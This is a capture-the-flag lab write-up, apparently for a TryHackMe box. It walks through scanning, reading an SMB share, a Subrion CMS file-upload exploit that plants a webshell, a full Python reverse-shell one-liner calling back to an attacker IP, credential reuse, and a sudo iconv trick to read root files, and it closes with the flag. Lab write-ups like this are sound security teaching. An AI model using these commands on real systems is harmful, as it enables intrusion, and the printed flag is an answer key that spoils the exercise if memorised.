#writeups

```
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.185.218/wordpress/]
/test                 (Status: 301) [Size: 313] [--> http://10.10.185.218/test/]
```



--nmap--
```
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b4c23506f36007ca67c1173c1a8600c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34508/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31900/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59042/udp): CLEAN (Timeout)
|   Check 4 (port 40583/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-03-19T12:14:46+05:30
| smb2-time: 
|   date: 2023-03-19T06:44:45
|_  start_date: N/A
|_clock-skew: mean: -1h49m52s, deviation: 3h10m29s, median: 6s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

```

--wordpress--

```

[+] XML-RPC seems to be enabled: http://10.10.185.218/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

```


Trying to check smb listing(*enum4linux*) looking for good stuff like we see smd port are open
```
//10.10.185.218/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                 
//10.10.185.218/websvr  Mapping: OK Listing: OK Writing: N/A
```
why not checking if they share have somthing interesting, `smbclient \\\\10.10.185.218\\websvr`, case sensitive,
so look what I found
```
enter.txt    
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```
and this hash for the admin let's see what I'm gonna have, cyberchef with magic formula gave
`Scam2021` so we have `admin:Scam2021` for subrion creds but the wordpress part nothing, so in
the previous text file, in the step 2 they talk about the subrion/panel so, let's just jump right in
to see what's going on? `http://10.10.185.218/subrion/panel/`, yes there is a thing and it's an admin panel
btw we use the creds we got earlier. One thing subrion cms v4.2, I looked for an exploit and I found 
RCE - Arbitrary file upload, a script python I downloaded and executed to have some good results, let's see

```
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.185.218/subrion/panel/
[+] Success!
[+] Got CSRF token: B2OufNw0b70PjPAX1jO3gxqBs2hHwwNor6b00VPz
[+] Trying to log in...

[x] Login failed... Check credentials
```
ok so let me see if I can add the creds `python fileUploadSubrion.py -u http://10.10.185.218/subrion/panel/ -l admin -p Scam2021`
```
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.185.218/subrion/panel/
[+] Success!
[+] Got CSRF token: BP48Hl8WFr7nX3Jk4Se2eDZ2JJEflePb1uIsp5b2
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: rnsqmdhkmdneuqg

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.185.218/subrion/panel/uploads/rnsqmdhkmdneuqg.phar 
``` 
yaoooooooooo I  got the shell then to make more persistence a make a revshell

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.91.36",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


that the content of wp-config.php maybe they he used the same creds for their machine
```
/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```
the box have some duration time, so that why you should speedrun a little on what you doing
and with a revshell you have enough time and freedom to make a lot of things before the time is up.

the only things that change in the creds are there are not a user call support on the box, but support
it's a wordpress user, then the username you can get it by seeing the /home

I tried to coneect myself with ssh, I got sucess with the `scamsite` user, and then make a `sudo -l`,
I found `(ALL) NOPASSWD: /usr/bin/iconv`, so GTFobins my friend has smthing to me I supposed, let's see

`sudo -u root iconv -f 8859_1 -t 8859_1 "/root/root.txt"`, and then I found the flag

851b8233a8c09400ec30651bd1529bf1ed02790b



https://medhatfathy.medium.com/tryhackme-tech-supp0rt-1-writeup-f5fe48d671a6
https://defaltlibary.blogspot.com/2022/04/techsupp0rt-1-tryhackme.html
